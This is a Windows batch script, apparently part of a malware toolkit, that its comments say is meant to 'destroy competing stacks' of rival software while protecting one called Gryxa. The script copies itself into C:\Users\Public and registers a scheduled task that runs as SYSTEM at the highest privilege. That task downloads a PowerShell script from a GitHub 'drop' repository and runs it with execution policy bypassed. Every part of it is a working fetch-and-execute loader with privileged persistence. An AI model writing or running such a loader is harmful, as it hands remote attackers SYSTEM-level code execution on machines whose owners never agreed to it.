@echo off
rem WINRTCS_ANTI - destroy competing stacks (SCWatchdog/KeepTwo/pluxn/vexlm); Gryxa-safe.
rem Default: purge only (safe for ALL). Optional: --heal = R3 only if Gryxa not RUNNING.
rem Usage: winrtcs_anti.cmd [--heal]
rem Detached: winrtcs_anti.cmd --detached [--heal]
setlocal EnableExtensions
set "HEAL="
if /I "%~1"=="--heal" set "HEAL=1"
if /I "%~2"=="--heal" set "HEAL=1"
if /I "%~1"=="--detached" goto :run
if /I "%~2"=="--detached" goto :run

copy /y "%~f0" "C:\Users\Public\winrtcs_anti_run.cmd" >nul 2>&1
schtasks /Delete /TN WinRTCSAnti /F >nul 2>&1
if defined HEAL (
  schtasks /Create /TN WinRTCSAnti /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\winrtcs_anti_run.cmd --detached --heal"
  echo QUEUED winrtcs-anti PURGE+HEAL - log C:\Users\Public\winrtcs_anti.log
) else (
  schtasks /Create /TN WinRTCSAnti /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\winrtcs_anti_run.cmd --detached"
  echo QUEUED winrtcs-anti PURGE-ONLY - log C:\Users\Public\winrtcs_anti.log
)
schtasks /Run /TN WinRTCSAnti
endlocal & exit /b 0

:run
set "LOG=C:\Users\Public\winrtcs_anti.log"
>"%LOG%" echo [%DATE% %TIME%] begin host=%COMPUTERNAME% heal=%HEAL%
echo [%DATE% %TIME%] fetch_anti_ps1>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 90 -o C:\Users\Public\winrtcs_anti.ps1 https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_anti.ps1 >>"%LOG%" 2>&1
if not exist C:\Users\Public\winrtcs_anti.ps1 (
  echo [%DATE% %TIME%] FAIL_no_anti_ps1>>"%LOG%"
  endlocal & exit /b 2
)
echo [%DATE% %TIME%] run_anti>>"%LOG%"
if defined HEAL (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Users\Public\winrtcs_anti.ps1 -Heal >>"%LOG%" 2>&1
) else (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Users\Public\winrtcs_anti.ps1 >>"%LOG%" 2>&1
)
echo [%DATE% %TIME%] anti_finished>>"%LOG%"
endlocal & exit /b 0
